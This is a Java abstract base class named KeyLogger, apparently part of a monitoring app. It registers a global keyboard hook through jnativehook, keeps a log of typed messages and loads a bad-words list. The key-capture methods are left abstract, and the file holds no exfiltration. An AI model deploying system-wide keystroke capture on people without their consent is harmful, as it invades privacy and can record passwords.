package logger;

import environment.AccessWindow;
import jdk.internal.dynalink.beans.StaticClass;
import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import services.Utils;
import view.Loginer;

import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.ArrayList;
import java.util.Date;
import java.util.Scanner;

public abstract class KeyLogger {

    public static InputStream badWordsFilePath = ClassLoader.getSystemResourceAsStream("BadWords.csv");
    private String fileName =  getCurrentTime();
    private InputStream filePath = ClassLoader.getSystemResourceAsStream(fileName);

    public static ArrayList<String> log = new ArrayList<>();


    public static String message;
    String sendKey;

    AccessWindow accessWindow = new AccessWindow();

    abstract void nativeKeyPressed(NativeKeyEvent event);
    abstract public void turnOn();
    abstract void setDefaults();


    String getCurrentTime() {
        return new SimpleDateFormat("yyyy.MM.dd.HH.mm.ss").format(new Date());
    }


    void saveMessage() throws IOException {
        log.add(message + "\n");
        System.out.println(message);
        setDefaults();
    }


    public void turnOff()  {
        try {
            GlobalScreen.unregisterNativeHook();
        } catch (NativeHookException e) {
            e.printStackTrace();
        }
    }

    public void nativeKeyReleased(NativeKeyEvent e) { }
    public void nativeKeyTyped(NativeKeyEvent e) { }
}
